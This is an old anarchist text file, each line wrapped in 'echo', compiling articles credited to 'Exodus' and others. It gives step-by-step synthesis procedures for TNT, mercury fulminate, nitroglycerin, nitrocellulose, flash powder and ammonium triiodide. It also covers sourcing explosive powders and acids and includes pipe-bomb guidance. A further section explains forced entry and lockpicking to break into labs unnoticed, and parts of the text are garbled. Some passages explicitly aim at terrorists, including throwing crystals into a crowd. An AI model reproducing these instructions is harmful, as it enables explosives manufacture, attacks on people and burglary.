echo acid, composed of 54« grams each of nitric acid (d. 1«0) and sulfuric acid (d. 1.84), is added slowly drop by drop from a dropping funnel while 
echo the mixture is stirred mechanically. The heat generated by the reaction raises the temperature, and the rate of addition of the acid is regulated 
echo so that the temperature of the mixture lies always between 90ø and 100ø. The addition of the acid will require about 1 hour. After the acid has 
echo been added, the mixture is stirred for 2 hours longer at 90ø-100ø to complete the nitration. Two layers separate on standing. The upper layer 
echo consists largely of dinitrotoluene (DNT), but probably contains a certain amount of TNT. The trinitration in the laboratory is conveniently carried 
echo out without separating the DNT from the spent acid.
echo While the dinitration mixture is stirred actively at a temperature of about 90ø, 145 grams of fuming sulfuric acid (petroleum containing 15% free 
echo SO3) is added slowly by pouring from a beaker. A mixed acid, composed of 72« grams each of nitric acid (d. 1«0) and the 15% petroleum, is 
echo now added drop by drop with good agitation while the heat of the reaction maintains the temperature at 100-115ø. After about three-quarters 
echo of the acid has been added, it will be found necessary to apply external heat to maintain the temperature. After all the acid has been added 
echo (taking 1 « to 2 hours), the heating and stirring are continued for 2 hours longer at 100-115ø. After the material has stood overnight, the upper 
echo TNT layer will be found to have solidified to a hard cake, and the lower layer of spent acid to be filled with cdata bstals. The acid is filtered 
echo through a Buchner funnel (without filter paper), and the cake is broken up and washed with water on the same filter to remove excess of acid. 
echo The spent acid contains considerable amounts of TNT in solution; this is precipitated by pouring the acid into a large volume of water, filtered 
echo off, rinsed with water, and added to the main batch. All the of the product is washed three or four times by agitating it vigorously with hot 
echo water under which it is melted. After the last washing, the TNT is granulated by allowing it to cool slowly under hot water while the stirring is 
echo continued. The product, filtered off and dried at ordinary room temperature, is equal to a good commercial sample of crude TNT. It may be 
echo purified by dissolving in warm alcohol at 60ø and allowing to cool slowly, or it may be purified by digesting with 5 times its weight of 5% sodium 
echo hydrogen sulfite solution at 90ø for half an hour with vigorous stirring, washing with hot water until the washings are colorless, and finally 
echo granulating as before. The product of this last treatment is equal to a good commercial sample of purified TNT. Pure ALPHA -TNT, melting point 
echo 80.8ø, may be procured by recrystallizing this material once from nitric acid (d. 1.42) and once from alcohol.

echo 184.ANARCHY 'N' EXPLOSIVES - VOLUME 5 by Exodus
echo Well, hasn't it been long since Volume 4 of Anarchy 'n' Explosives? Well, I finally got around to typing up another volume. This one will be 
echo dedicated to the extremely simple and more accessible explosives and incendiaries to be prepared at home, or laboratory; depending upon the 
echo environment you have access to or are accustomed to.
echo For further information and/or comments on this series of ever popular explosives, contact me (I don't sign these "publications") on the 
echo Knavery BBS at xxx-xxx-xxxx on the public message base, I should be reading some requests if you leave them. And, volume number 6 
echo should be coming out sooner than the time between 4 and 5, but don't count on it.
echo BULK POWDERS:
echo Bulk powders are types of gunpowder consisting of nitrocellulose and a mixture of other chemically explosive solutions. These nitrocellulose 
echo fibers are stuck together, but are not completely collided. Some contain little else but nitrocellulose; others contain, in addition to potassium and 
echo barium nitrates, camphor, vaseline, paraffin, lampblack, starch, dextrin, potassium dichromate or other oxidizing or deterrent salts, and 
echo diphenylamine for stabilization, and are colored in a variety of brilliant hues by means of coltar dyes. Three typical bulk powders are made up 
echo according to the approximate formulas tabulated below:
echo Nitrocellulose 84.0 87.0 89.0
echo % N in nitrocellulose 13.2 12.9 12.9
echo Potassium nitrate 7« 6.0 6.0
echo Barium nitrate 7« 2.0 3.0
echo Starch 0.0 0.0 1.0
echo Paraffin oil 0.0 4.0 0.0
echo Diphenylamine 1.0 1.0 1.0
echo The mixture is mixed in warm water and dried thoroughly. Then either granulated or made into powder by crushing with a wooden block and 
echo screened through a 12-mesh sieve. The material is then stored in a moisture-resistant container for future or immediate use.
echo MERCURY FULMINATE:
echo Mercury fulminate is an initiating explosive, commonly appearing as white or gray crystals. It is extremely sensitive to initiation by heat, friction, 
echo spark or flame, and impact. It detonates when initiated by any of these means. It is pressed into containers, usually at 3000 psi, for use in 
echo detonators and blasting caps. However, when compressed at greater and greater pressure (up to 30,000 psi), it becomes "dead pressed." In 
echo this condition, it can only be detonated by another initial detonating agent. Mercury fulminate gradually becomes inert when stored continuously 
echo above 100øF. A dark colored product of deterioration gives evidence of this effect. Mercury exfulminate is stored underwater except when 
echo there is danger of freezing. Then it is stored under a mixture of water and alcohol.
echo Preparation of Mercury Fulminate. Five grams of mercury is added Ext 55 cc. of nitric acid (specific gravity 1.42) in a 100-cc. Erlenmeyer flask, 
echo and the mixture is allowed to stand without shaking until the mercury has gone into solution. The acid liquid is then poured into 50 cc. of 90% 
echo alcohol in a 500-cc. beaker in the hood. The temperature of the mixture rises, a vigorous reaction commences, white fumes come off, and 
echo cdata bstals of fulminate soon begin to precipitate. Red fumes appear and the precipitation of the fulminate becomes more rapid, then white 
echo fumes again as the reaction moderates. After about 20 minutes, the reaction is over; water is added, and the cdata bstals are washed with 
echo water repeatedly by decantation until the washings are no longer acid to litmus. The product consists of grayish-yellow cdata bstals, and 
echo corresponds to a good grade of commercial fulminate. It may be obtained white and entirely pure by dissolving in strong ammonia water, 
echo filtering, and reprecipitating by the addition of 30% acetic acid. The pure fulminate is filtered off, washed several times with cold water, and 
echo stored under water, or, if a very small amount is desired for experimental purposes, it is dried in a desiccator.
echo AMATOL:
echo Description: amatol is a high explosive, white to buff in color. It is a mixture of ammonium nitrate and TNT, with a relative effectiveness slightly 
echo higher than that of TNT alone. Common compositions vary from 80% ammonium nitrate and 20% TNT to 40% ammonium nitrate and 60% TNT. 
echo Amatol is used as the main bursting charge in artillery shells and bombs. Amatol absorbs moisture and can form dangerous compounds with 
echo copper and brass. Therefore, it should not be housed in containers of such metals.
echo BLACK POWDERS:
echo Black powders burn either quickly or very slowly depending on the composition of such a mixture; however, these powders produce smoke, 
echo often great amounts, and is most useful in applications where smoke is no object. It is the best for communicating fire and for producing a 
echo quick, hot flame. Black powder is used in both propellant charges for shrapnel shells, in saluting and blank fire charges, as the bursting charge 
echo of practice shells and bombs, as a propelling charge in certain pyrotechnic pieces, and, either with or without the admixture of other 
echo substances which modify the rate of burning, in the time-train rings and in other parts of fuses. Below is a list of black powders and their 
echo compositions.

echo 185.Explosives and Propellants by Exodus
echo Almost any city or town of reasonable size has a gun store and one or more pharmacies. These are two of the places that potential terrorists 
echo visit in order to purchase explosive material. All that one has to do is know something about the non- explosive uses of the materials. Black 
echo powder, for example, is used in blackpowder firearms. It comes in varying "grades", with each different grade being a slightly different size. 
echo The grade of black powder depends on what the caliber of the gun that it is used in; a fine grade of powder could burn too fast in the wrong 
echo caliber weapon. The rule is: the smaller the grade, the faster the burn rate of the powder.
echo BLACK POWDER
echo Black powder is generally available in three grades. As stated before, the smaller the grade, the faster the powder burns. Burn rate is 
echo extremely important in bombs. Since an explosion is a rapid increase of gas volume in a confined environment, to make an explosion, a quickburning powder is desirable. The three common grades of black powder are listed below, along with the usual bore width (caliber) of what 
echo they are used in. Generally, the fastest burning powder, the FFF grade is desirable. However, the other grades and uses are listed below:
echo GRADE BORE WIDTH EXAMPLE OF GUN
echo F «0 or Greater Model Cannon; some Rifles
echo FF .36 - «0 Large Pistols; Small Rifles
echo FFF .36 or Smaller Pistols; Derringers
echo The FFF grade is the fastest burning, because the smaller grade has more surface area or burning surface exposed to the flame front. The 
echo larger grades also have uses which will be discussed later. The price range of black powder, per pound, is about $8«0 - $9.00. The price is 
echo not affected by the grade, and so one saves oneself time and work if one buys the finer grade of powder. The major problems with black 
echo powder are that it can be ignited accidentally by static electricity, and that it has a tendency to absorb moisture from the air. To safely crush it, 
echo a one would use a plastic spoon and a wooden salad bowl. Taking a small pile at a time, he or she would apply pressure to the powder 
echo through the spoon and rub it in a series of strokes or circles, but not too hard. It is fine enough to use when it is about as fine as flour. The 
echo fineness, however, is dependent on what type of device one wishes to make; obviously, it would be impractical to crush enough powder to fill 
echo a 1 foot by 4 inch radius pipe. Any adult can purchase black powder, since anyone can own black powder firearms in the United States. 
echo PYRODEX
echo Pyrodex is a synthetic powder that is used like black powder. It comes in the same grades, but it is more expensive per pound. However, a 
echo one pound container of pyrodex contains more material by volume than a pound of black powder. It is much easier to crush to a very fine 
echo powder than black powder, and it is considerably safer and more reliable. This is because it will not be set off by static electricity, as black can 
echo be, and it is less inclined to absorb moisture. It costs about $10.00 per pound. It can be crushed in the same manner as black powder, or it can 
echo be dissolved in boiling water and dried.
echo ROCKET ENGINE POWDER
echo One of the most exciting hobbies nowadays is model rocketry. Estes is the largest producer of model rocket kits and engines. Rocket engines 
echo are composed of a single large grain of propellant. This grain is surrounded by a fairly heavy cardboard tubing. One gets the propellant by 
echo slitting the tube length- wise, and unwrapping it like a paper towel roll. When this is done, the gray fire clay at either end of the propellant grain 
echo must be removed. This is usually done gently with a plastic or brass knife. The material is exceptionally hard, and must be crushed to be used. 
echo By gripping the grain in the widest setting on a set of pliers, and putting the grain and powder in a plastic bag, the powder will not break apart 
echo and shatter all over. This should be done to all the large chunks of powder, and then it should be crushed like black powder. Rocket engines 
echo come in various sizes, ranging from 1/4 A-2T to the incredibly powerful D engines. The larger the engine, the more expensive. D engines come 
echo in packages of three, and cost about $5.00 per package. Rocket engines are perhaps the single most useful item sold in stores to a terrorist, 
echo since they can be used as is, or can be cannibalized for their explosive powder.

echo RIFLE/SHOTGUN POWDER
echo Rifle powder and shotgun powder are really the same from a practical standpoint. They are both nitrocellulose based propellants. They will be 
echo referred to as gunpowder in all future references. Smokeless gunpowder is made by the action of concentrated nitric and sulfuric acid upon 
echo cotton or some other cellulose material. This material is then dissolved by solvents and then reformed in the desired grain size. When dealing 
echo with smokeless gunpowder, the grain size is not nearly as important as that of black powder. Both large and small grained smokeless powder 
echo burn fairly slowly compared to black powder when unconfined, but when it is confined, gunpowder burns both hotter and with more gaseous 
echo expansion, producing more pressure. Therefore, the grinding process that is often necessary for other propellants is not necessary for 
echo smokeless powder. Powder costs about $9.00 per pound. In most states any citizen with a valid driver's license can buy it, since there are 
echo currently few restrictions on rifles or shotguns in the US There are now ID checks in many states when purchasing powder at a retail outlet. 
echo Mail-orders aren't subject to such checks. Rifle powder and pyrodex may be purchased by mail order, but UPS charges will be high, due to 
echo DOT regulations on packaging.

echo 186.Lockpicking III by Exodus
echo If it becomes necessary to pick a lock to enter a lab, the world's most effective lockpick is dynamite, followed by a sledgehammer. There are 
echo unfortunately, problems with noise and excess structural damage with these methods. The next best thing, however, is a set of professional 
echo lockpicks.
echo These, unfortunately, are difficult to acquire. If the door to a lab is locked, but the deadbolt is not engaged, then there are other possibilities. The 
echo rule here is: if one can see the latch, one can open the door. There are several devices which facilitate freeing the latch from its hole in the 
echo wall. Dental tools, stiff wire ( 20 gauge ), specially bent aluminum from cans, thin pocket knives, and credit cards are the tools of the trade. The 
echo way that all these tools and devices are uses is similar: pull, push, or otherwise move the latch out of its recess in the wall, thus allowing the 
echo door to open. This is done by sliding whatever tool that you are using behind the latch, and forcing the latch back into the door.
echo Most modern doorknob locks have two fingers. The larger finger holds the door closed while the second (smaller) finger only prevents the first 
echo finger from being pressed in when it (the second finger) is pressed in by the catchplate of the door. If you can separate the catch plate and 
echo the lock sufficiently far, the second finger will slip out enough to permit the first finger to be slipped.
echo (Ill. 2.11) ___
echo  | } <
echo  Small -> (| } <--- The large (first) finger
echo  second |___} <
echo  finger
echo Some methods for getting through locked doors are:
echo 1.Another method of forced entry is to use an automobile jack to force the frame around the door out of shape, freeing the latch or exposing it 
echo to the above methods. This is possible because most door frames are designed with a slight amount of "give". Simply put the jack into 
echo position horizontally across the frame in the vicinity of the latch, and jack it out. If the frame is wood it may be possible to remove the jack
echo after shutting the door, which will relock the door and leave few signs of forced entry. This technique will not work in concrete block 
echo buildings, and it's difficult to justify an auto jack to the security guards.
echo 2.Use a screwdriver or two to pry the lock and door apart. While holding them apart, try to slip the lock. Screwdrivers, while not entirely 
echo innocent, are much more subtle than auto jacks, and much faster if they work. If you're into unsubtle, I suppose a crowbar would work 
echo too, but then why bother to slip the lock at all?
echo 3.Find a set of double doors. They are particularly easy to pry apart far enough to slip.
echo 4.If the lock is occasionally accessible to you while open, "adjust" or replace the catchplate to make it operate more suitably (i.e., work so that it 
echo lets both fingers out, so that it can always be slipped). If you want, disassembling the lock and removing some of the pins can make it 
echo much easier to pick.
echo 5.If, for some odd reason, the hinges are on your side (i.e., the door opens outward), remove the hinge pins, provided they aren't stopped with 
echo welded tabs. Unfortunately, this too lacks subtlety, in spite of its effectiveness.
echo 6.If the door cannot be slipped and you will want to get through regularly, break the mechanism. Use of sufficient force to make the first finger 
echo retreat while the second finger is retreated will break some locks (e.g., Best locks) in such a way that they may thereafter be slipped 
echo trivially, yet otherwise work in all normal ways. Use of a hammer and/or screwdriver is recommended. Some care should be used not to 
echo damage the door jamb when attempting this on closed and locked doors, so as not to attract the attention of the users or owners or 
echo locksmith or police exc.
echo 7.Look around in desks. People very often leave keys to sensitive things in them or other obvious places. Especially keys to shared critical 
echo resources, like supply rooms, that are typically key -limited but that everyone needs access to. Take measurements with a micrometer, or 
echo make a tracing (lay key under paper and scribble on top), or be dull and make a wax impression. Get blanks for the key type (can be very 
echo difficult for better locks; I won't go into methods, other than to say that if you can get other keys made from the same blank, you can often 
echo work wonders with a little ingenuity) and use a file to reproduce the key. Using a micrometer works best: keys made from mic 
echo measurements are more likely to work consistently than keys made by any other method. If you us tracings, it is likely to take many tries 
echo before you obtain a key that works reliably. Also, if you can 'borrow' the cylinder and disassemble it, pin levels can be obtained and keys 
echo constructed.
echo 8.Simple locks, like desks, can be picked fairly easily. Many desks have simple three or four pin locks of only a few levels, and can be 
echo consistently picked by a patient person in a few minutes. A small screwdriver and a paper clip will work wonders in practiced hands. 
echo Apply a slight torque to the lock in the direction of opening with the screwdriver. Then 'rake' the pins with the unfolded paper clip. With 
echo practice, you'll apply enough pressure with the screwdriver that the pins will align properly (they'll catch on the cylinder somewhere 
echo between the top and bottom of their normal travel), and once they're all lined up, additional pressure on the screwdriver will then open the 
echo lock. This, in conjunction with (7) can be very effective. This works better with older or sloppily machined locks that have a fair amount of 
echo play in the cylinder. Even older quality locks can be picked in this manner, if their cylinders have been worn enough to give enough play to 
echo allow pins to catch reliably. Even with a well worn quality lock, though, it generally takes a *lot* of patience.
echo 9.Custodial services often open up everything in sight and then take breaks. Make the most of your opportunities.
echo 10.No matter what you're doing, look like you belong there. Nothing makes anyone more suspicious than someone skulking about, obviously 
echo trying to look inconspicuous. If there are several of you, have some innocuous and normal seeming warning method ("Hey, dummy What 
echo time is it?") so that they can get anything suspicious put away. Don't travel in large groups at 3AM. Remember, more than one car thief 
echo has managed to enlist a cop's aid in breaking into a car. Remember this. Security people usually *like* to help people. Don't make them 
echo suspicious or annoy them. If you do run into security people, try to make sure that there won't be any theft or break-ins reported there the 
echo next day...
echo 11.Consider the possibilities of master keys. Often, every lock in a building or department will have a common master (building entrance keys 
echo are a common exception). Take apart some locks from different places that should have common masters, measure the different pin 
echo lengths in each, and find lengths in common. Experiment. Then get into those places you're *really* curious about.
echo 12.Control keys are fun, too. These keys allow the user to remove the lock's core, and are generally masters. (A pair of needle nose pliers or 
echo similar tool can then be used to open the lock, if desired.)
echo SLIPPING A LOCK
echo The best material we've found for slips so far is soft sheet copper. It is quite flexible, so it can be worked into jambs easily, and can be prebent as needed. In the plane of the sheet, however, it is fairly strong, and pulls nicely. Of course, if they're flexible enough, credit cards, 
echo student Ids, etc., work just fine on locks that have been made slippable if the door jamb is wide enough. Wonderfully subtle, quick, and 
echo delightfully effective. Don't leave home without one.
echo  (Ill. #1)
echo The sheet should then be folded to produce an L, J, or U shaped device that looks like this:
echo  ________________________________________
echo  /________________________________________| 
echo  | |
echo  | | L-shaped
echo  | |
echo  | |
echo  |_|
echo (Ill. #2)
echo  _____________________________
echo  / ___________________________|
echo  | |
echo  | | J-shaped
echo  | |

echo (Ill. #3)
echo  _____________________
echo  / ___________________|
echo  | |
echo  | |
echo  | | U-shaped
echo  | |
echo  | |____________________
echo  \____________________|
echo We hasten to add here that ma ny or most colleges and universities have very strict policies about unauthorized possession of keys. At most, it 
echo is at least grounds for expulsion, even without filing criminal charges. Don't get caught with keys The homemade ones are particularly 
echo obvious, as they don't have the usual stamps and marks that the locksmiths put on to name and number the keys.]
echo We should also point out that if you make a nuisance of yourself, there are various nasty things that can be done to catch you and/or slow you 
echo down. For instance, by putting special pin mechanisms in, locks can be made to trap any key used to open them. If you lose one this way, 
echo what can I say? At least don't leave fingerprints on it. Or make sure they're someone else's. Too much mischief can also tempt the powers that 
echo be to rekey.

echo 188.Nitroglycerin II by Exodus
echo Nitroglycerin is one of the most sensitive explosives, if it is not the most sensitive. Although it is possible to make it safely, it is difficult. Many a 
echo young anarchist has been killed or seriously injured while trying to make the stuff. When Nobel's factories make it, many people were killed by 
echo the all-to-frequent factory explosions. Usually, as soon as it is made, it is converted into a safer substance, such as dynamite. An idiot who 
echo attempts to make nitroglycerin would use the following procedure:
echo MATERIAL:
echo · Distilled Water
echo · Table Salt
echo · Sodium Bicarbonate
echo · Concentrated Nitric Acid (13 mL)
echo · Concentrated Sulfuric Acid (39 mL)
echo · Glycerin
echo EQUIPMENT:
echo · Eye-Dropper 
echo · 100 mL Beaker 
echo · 200-300 mL Beakers (2)
echo · Ice Bath Container (A plastic bucket serves well)
echo · Centigrade Thermometer 
echo · Blue Litmus Paper 
echo 1.Place 150 mL of distilled water into one of the 200-300 mL beakers.
echo 2.In the other 200-300 mL beaker, place 150 mL of distilled water and about a spoonful of sodium bicarbonate, and stir them until the sodium 
echo bicarbonate dissolves. Do not put so much sodium bicarbonate in the water so that some remains undissolved.
echo 3.Create an ice bath by half filling the ice bath container with ice, and adding table salt. This will cause the ice to melt, lowering the overall 
echo temperature.
echo 4.Place the 100 mL beaker into the ice bath, and pour the 13 mL of concentrated nitric acid into the 100 mL beaker. Be sure that the beaker will 
echo not spill into the ice bath, and that the ice bath will not overflow into the beaker when more materials are added to it. Be sure to have a 
echo large enough ice bath container to add more ice. Bring the temperature of the acid down to about 20øC or less.
echo 5.When the nitric acid is as cold as stated above, slowly and carefully add the 39 mL of concentrated sulfuric acid to the nitric acid. Mix the 
echo two acids together, and cool the mixed acids to 10øC. It is a good idea to start another ice bath to do this.
echo 6.With the eyedropper, slowly put the glycerin into the mixed acids, one drop at a time. Hold the thermometer along the top of the mixture 
echo where the mixed acids and glycerin meet.
echo DO NOT ALLOW THE TEMPERATURE TO GET ABOVE 30ø CENTIGRADE
echo IF THE TEMPERATURE RISES ABOVE THIS TEMPERATURE, WATCH OUT 
echo 7.The glycerin will start to nitrate immediately, and the temperature will immediately begin to rise. Add glycerin until there is a thin layer of 
echo glycerin on top of the mixed acids. It is always safest to make any explosive in small quantities.
echo 8.Stir the mixed acids and glycerin for the first ten minutes of nitration, adding ice and salt to the ice bath to keep the temperature of the solution 
echo in the 100 mL beaker well below 30øC. Usually, the nitroglycerin will form on the top of the mixed acid solution, and the concentrated 
echo sulfuric acid will absorb the water produced by the reaction.
echo 9.When the reaction is over, and when the nitroglycerin is well below 30øC, slowly and carefully pour the solution of nitroglycerin and mixed 
echo acid into the distilled water in the beaker in step 1. The nitroglycerin should settle to the bottom of the beaker, and the water-acid solution 
echo on top can be poured off and disposed of. Drain as much of the acid- water solution as possible without disturbing the nitroglycerin.
echo 10.Carefully remove the nitroglycerin with a clean eye-dropper, and place it into the beaker in step 2. The sodium bicarbonate solution will 
echo eliminate much of the acid, which will make the nitroglycerin more stable, and less likely to explode for no reason, which it can do. Test the 
echo nitroglycerin with the litmus paper until the litmus stays blue. Repeat this step if necessary, and use new sodium bicarbonate solutions as 
echo in step 2.
echo 11.When the nitroglycerin is as acid-free as possible, store it in a clean container in a safe place. The best place to store nitroglycerin is far 
echo away from anything living, or from anything of any value. Nitroglycerin can explode for no apparent reason, even if it is stored in a secure 
echo cool place.

echo 189.Cellulose Nitrate by Exodus
echo I used to make nitrocellulose, though. It was not guncotton grade, because I didn't have petroleum (H2SO4 with dissolved SO3); nevertheless it 
echo worked. At first I got my H2SO4 from a little shop in downtown Philadelphia, which sold soda-acid fire extinguisher refills. Not only was the 
echo acid concentrated, cheap and plentiful, it came with enough carbonate to clean up. I'd add KNO3 and a little water (OK, I'd add the acid to the 
echo water - but there was so little water, what was added to what made little difference. It spattered concentrated H2SO4 either way). Later on, 
echo when I could purchase the acids, I believe I used 3 parts H2SO4 to 1 part HNO3. For cotton, I'd use cotton wool or cotton cloth.
echo Runaway nitration was commonplace, but it is usually not so disastrous with nitrocellulose as it is with nitroglycerin. For some reason, I tried 
echo washing the cotton cloth in a solution of lye, and rinsing it well in distilled water. I let the cloth dry and then nitrated it. (Did I read this 
echo somewhere?) When that product was nitrated, I never got a runaway reaction. By the way, water quenched the runaway reaction of 
echo cellulose.
echo The product was washed thoroughly and allowed to dry. It dissolved (or turned into mush) in acetone. It dissolved in alcohol/ether.
echo WARNINGS
echo All usual warnings regarding strong acids apply. H2SO4 likes to spatter. When it falls on the skin, it destroys tissue - often painfully. It 
echo dissolves all manner of clothing. Nitric also destroys skin, turning it bright yellow in the process. Nitric is an oxidant - it can start fires. Both 
echo agents will happily blind you if you get them in your eyes. Other warnings also apply. Not for the novice.
echo Nitrocellulose decomposes very slowly on storage if it isn't stabilized. The decomposition is autocatalyzing, and can result in spontaneous 
echo explosion if the material is kept confined over time. The process is much faster if the material is not washed well enough. Nitrocellulose 
echo powders contain stabilizers such as diphenyl amine or ethyl centralite. DO NOT ALLOW THESE TO COME INTO CONTACT WITH NITRIC ACID 
echo A small amount of either substance will capture the small amounts of nitrogen oxides that result from decomposition. They therefore inhibit the 
echo autocatalysis. NC eventually will decompose in any case.
echo Again, this is inherently dangerous and illegal in certain areas. I got away with it. You may kill yourself and others if you try it.
echo Commercially produced Nitrocellulose is stabilized by:
echo 1.Spinning it in a large centrifuge to remove the remaining acid, which is recycled.
echo 2.Immersion in a large quantity of fresh water.
echo 3.Boiling it in acidulated water and washing it thoroughly with fresh water.
echo If the NC is to be used as smokeless powder it is boiled in a soda solution, then rinsed in fresh water.
echo The purer the acid used (lower water content) the more complete the nitration will be, and the more powerful the nitrocellulose produced.
echo There are actually three forms of cellulose nitrate, only one of which is useful for pyrotechnic purposes. The mononitrate and dinitrate are not 
echo explosive, and are produced by incomplete nitration. If nitration is allowed to proceed to complete the explosive trinatrate is formed.

echo 191.Flash Powder By Dr. Tiel
echo Here are a few basic precautions to take if you're crazy enough to produce your own flash powder:
echo 1.Grind the oxidizer (KNO3, KClO3, KMnO4, KClO4 etc.) separately in a clean vessel.
echo 2.NEVER grind or sift the mixed composition.
echo 3.Mix the composition on a large paper sheet, by rolling the composition back and forth.
echo 4.Do not store flash compositions, especially any containing Mg.
echo 5.Make very small quantities at first, so you can appreciate the power of such mixtures.
echo KNO3 50% (by weight)
echo Mg 50%
echo It is very important to have the KNO3 very dry, if evolution of ammonia is observed then the KNO3 has water in it. Very pure and dry KNO3 is 
echo needed. KClO3 with Mg or Al metal powders works very well. Many hands, faces and lives have been lost with such compositions. KMnO4 
echo with Mg or Al is also an extremely powerful flash composition. KClO4 with Al is generally found in commercial fireworks, this does not mean 
echo that it is safe, it is a little safer than KClO3 above. KýCrýO7 can also be used as an oxidizer for flash powder. The finer the oxidizer and the 
echo finer the metal powder the more powerful the explosive. This of course will also increase the sensitivity of the flash powder.
echo For a quick flash small quantities can be burnt in the open. Larger quantities (50g or more) ignited in the open can detonate, they do not need a 
echo container to do so.
echo NOTE: Flash powder in any container will detonate.
echo Balanced equations of some oxidizer/metal reactions. Only major products are considered. Excess metal powders are generally used. This 
echo excess burns with atmospheric oxygen.
echo · 4 KNO3 + 10 Mg --> 2 KýO + 2 Ný + 10 MgO + Energy
echo · KClO3 + 2 Al --> KCl + AlýO3 + Energy
echo · 3 KClO4 + 8 Al --> 3 KCl + 4 AlýO3 + Energy
echo · 6 KMnO4 + 14 Al --> 3 KýO + 7 AlýO3 + 6 Mn + Energy
echo Make Black Powder first if you have never worked with pyrotechnic materials, then think about this stuff.

echo An "own goal" is the death of a person on your side from one of your own devices. It is obvious that these should be avoided at all costs. 
echo While no safety device is 100% reliable, it is usually better to err on the side of caution.
echo BASIC SAFETY RULES
echo 1.DON'T SMOKE (Don't laugh - an errant cigarette wiped out the Weathermen)
echo 2.GRIND ALL INGREDIENTS SEPARATELY. It's surprising how friction sensitive some supposedly "safe" explosives really are.
echo 3.ALLOW for a 20% margin of error - Just because the AVERAGE burning rate of a fuse is 30 secs/foot, don't depend on the 5 inches sticking 
echo out of your pipe bomb to take exactly 2« minutes.
echo 4.OVERESTIMATE THE RANGE OF YOUR SHRAPNEL. The cap from a pipe bomb can often travel a block or more at high velocities before 
echo coming to rest - If you have to stay nearby, remember that if you can see it, it can kill you.
echo 5.When mixing sensitive compounds (such as flash powder) avoid all sources of static electricity. Mix the ingredients by the method below:
echo HOW TO MIX INGREDIENTS 
echo The best way to mix two dry chemicals to form an explosive is to do as the small-scale fireworks manufacturer's do:
echo Ingredients:
echo · 1 large sheet of smooth paper (for example a page from a newspaper that does not use staples)
echo · The dry chemicals needed for the desired compound.
echo 1.Measure out the appropriate amounts of the two chemicals, and pour them in two small heaps near opposite corners of the sheet.
echo 2.Pick up the sheet by the two corners near the powders, allowing the powders to roll towards the middle of the sheet.
echo 3.By raising one corner and then the other, roll the powders back and forth in the middle of the open sheet, taking care not to let the mixture 
echo spill from either of the loose ends.
echo 4.Pour the powder off from the middle of the sheet, and use immediately. If it must be stored use airtight containers (35mm film canisters work 
echo nicely) and store away from people, houses, and valuable items.

echo 195.Ammonium TriIodide Crystals by Exodus
echo Ammonium triiodide crystals are foul-smelling purple colored crystals that decompose under the slightest amount of heat, friction, or shock, if 
echo they are made with the purest ammonia (ammonium hydroxide) and iodine. Such crystals are said to detonate when a fly lands on them, or 
echo when an ant walks across them. Household ammonia, however, has enough impurities, such as soaps and abrasive agents, so that the 
echo crystals will detonate when thrown, crushed, or heated. Ammonia, when bought in stores comes in a variety of forms. The pine and cloudy 
echo ammonias should not be bought; only the clear ammonia should be used to make ammonium triiodide crystals. Upon detonation, a loud report is 
echo heard, and a cloud of purple iodine gas appears about the detonation site. Whatever the unfortunate surface that the crystal was detonated 
echo upon will usually be ruined, as some of the iodine in the crystal is thrown about in a solid form, and iodine is corrosive. It leaves nasty, ugly, 
echo permanent brownish-purple stains on whatever it contacts. Iodine gas is also bad news, since it can damage lungs, and it settles to the ground 
echo and stains things there also. Touching iodine leaves brown stains on the skin that last for about a week, unless they are immediately and 
echo vigorously washed off. While such a compound would have little use to a serious terrorist, a vandal could utilize them in damaging property. 
echo Or, a terrorist could throw several of them into a crowd as a distraction, an action which would possibly injure a few people, but frighten 
echo almost anyone, since a small crystal that may not be seen when thrown produces a rather loud explosion.
echo Ammonium triiodide crystals could be produced in the following manner:
echo Materials:
echo · Iodine crystals
echo · Clear ammonia (ammonium hydroxide, for the suicidal)
echo Equipment:
echo · Funnel and filter paper
echo · Paper towels
echo · Two throw-away glass jars
echo 1.Place about two teaspoons of iodine into one of the glass jars. The jars must both be throw away because they will never be clean again.
echo 2.Add enough ammonia to completely cover the iodine.
echo 3.Place the funnel into the other jar, and put the filter paper in the funnel. The technique for putting filter paper in a funnel is taught in every 
echo basic chemistry lab class: fold the circular paper in half, so that a semi-circle is formed. Then, fold it in half again to form a triangle with 
echo one curved side. Pull one thickness of paper out to form a cone, and place the cone into the funnel.
echo 4.After allowing the iodine to soak in the ammonia for a while, pour the solution into the paper in the funnel through the filter paper.
echo 5.While the solution is being filtered, put more ammonia into the first jar to wash any remaining crystals into the funnel as soon as it drains.
echo 6.Collect all the purplish crystals without touching the brown filter paper, and place them on the paper towels to dry for about an hour. Make 
echo sure that they are not too close to any lights or other sources of heat, as they could well detonate. While they are still wet, divide the wet 
echo material into eight pieces of about the same size.
echo 7.After they dry, gently place the crystals onto a one square inch piece of duct tape. Cover it with a similar piece, and gently press the duct 
echo tape together around the crystal, making sure not to press the crystal itself. Finally, cut away most of the excess duct tape with a pair of 
echo scissors, and store the crystals in a cool dry safe place. They have a shelf life of about a week, and they should be stored in individual 
echo containers that can be thrown away, since they have a tendency to slowly decompose, a process which gives off iodine vapors, which 
echo will stain whatever they settle on. One possible way to increase their shelf life is to store them in airtight containers. To use them, simply 
echo throw them against any surface or place them where they will be stepped on or crushed.

echo Sulfuric acid is far too difficult to make outside of a laboratory or industrial plant. However, it is readily available in an uncharged car battery. A 
echo person wishing to make sulfuric acid would simply remove the top of a car battery and pour the acid into a glass container. There would 
echo probably be pieces of lead from the battery in the acid which would have to be removed, either by boiling or filtration. The concentration of the 
echo sulfuric acid can also be increased by boiling it; very pure sulfuric acid pours slightly faster than clean motor oil.
echo AMMONIUM NITRATE
echo Ammonium nitrate is a very powerful but insensitive high-order explosive. It could be made very easily by pouring nitric acid into a large flask in 
echo an ice bath. Then, by simply pouring household ammonia into the flask and running away, ammonium nitrate would be formed. After the 
echo materials have stopped reacting, one would simply have to leave the solution in a warm place until all of the water and any unneutralized 
echo ammonia or acid have evaporated. There would be a fine powder formed, which would be ammonium nitrate. It must be kept in an airtight 
echo container, because of its tendency to pick up water from the air. The crystals formed in the above process would have to be heated VERY

echo mostly very fine burned particles. Black powder has one major problem... it can be ignited by static electricity. This is very bad, and it means 
echo that the material must be made with wooden or clay tools. Anyway, a misguided individual could manufacture black powder at home with the

echo EQUIPMENT:
echo · Clay grinding bowl and clay grinder -or- wooden salad bowl and wooden spoon
echo · Plastic Bags (3)
echo · 300-500 mL Beaker (1)
echo · Coffee Pot or Heat Source
echo 1.Place a small amount of the potassium or sodium nitrate in the grinding bowl and grind it to a very fine powder. Do this to all of the potassium 
echo or sodium nitrate, and store the ground powder in one of the plastic bags.
echo 2.Do the same thing to the sulfur and charcoal, storing each chemical in a separate plastic bag.
